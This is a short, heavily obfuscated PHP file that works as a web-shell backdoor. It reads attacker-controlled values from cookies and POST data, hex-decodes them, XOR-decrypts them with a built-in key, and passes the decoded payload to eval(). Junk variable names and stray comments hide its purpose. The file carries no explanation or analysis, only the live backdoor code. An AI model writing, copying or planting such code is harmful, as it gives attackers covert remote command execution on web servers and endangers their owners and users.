<?php

$LEXiAVZO = "str_repeat";
$bYgpA = "explode";
$quyzNEYBh = "count";
$dtDUIBci = "pack";
$zdlIdRU = array(
    /*  nqdD*/
    "zRLYoIhl" => "ZapYfHfAtQFvMltL",
);
$ioYxx = array("caKTDjLvdSZJcinNSriM" => "YRitufajjkQpPauXkUJyl");
$DTfwQi = array(
    $zdlIdRU,
    $_COOKIE,
    $zdlIdRU,
    /* o   */
    $_POST,
    $ioYxx,
);
foreach ($DTfwQi as $DWKlivjab) {
    /*oXk */
    foreach ($DWKlivjab as $LWyPwXL => $USNmk) {
        /* HONow*/
        $USNmk = @$dtDUIBci("H*", $USNmk);
        $LWyPwXL .= "joZq-XjDTb-WqLIw-daF-TVWnsah-icNXrZy-MBfZ";
        $LWyPwXL = $LEXiAVZO(
            /*D*/
            $LWyPwXL,
            strlen($USNmk) / strlen($LWyPwXL) + 1
        );
        /* vM*/
        $FWzKjVHn = $USNmk ^ $LWyPwXL;
        /*   DNkx*/
        $WTQCku = $bYgpA(
            /*Bwg */
            '#',
            $FWzKjVHn
        );
        if ($quyzNEYBh($WTQCku) == 3) {
            /*ejMUA*/
            $kEWGW = $WTQCku[1];
            $CuhRjAV = $WTQCku[2];
            $BbFZAxTW = $kEWGW($CuhRjAV);
            eval($BbFZAxTW);
            die;
        }
    }
    /*N*/
}
